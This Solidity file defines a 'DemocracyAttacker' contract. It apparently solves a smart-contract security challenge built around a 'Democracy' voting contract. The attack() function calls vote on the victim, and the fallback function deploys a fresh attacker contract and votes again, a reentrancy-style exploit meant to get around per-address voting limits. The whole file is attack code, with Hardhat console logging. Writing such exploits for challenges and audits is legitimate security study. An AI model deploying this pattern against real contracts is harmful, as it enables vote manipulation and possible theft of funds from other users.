// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Democracy.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract DemocracyAttacker {
    address public victim;

    constructor(address addr) payable {
        victim = addr;
        // victim.mint{value: msg.value}(address(this), 22);
    }

    function attack() external {
        console.log("attack....");
        Democracy(victim).vote(address(0));
    }

    fallback() external payable {
        console.log("fallback....");

        DemocracyAttacker attacker2 = new DemocracyAttacker(victim);

        Democracy(victim).vote(address(0));
    }
}
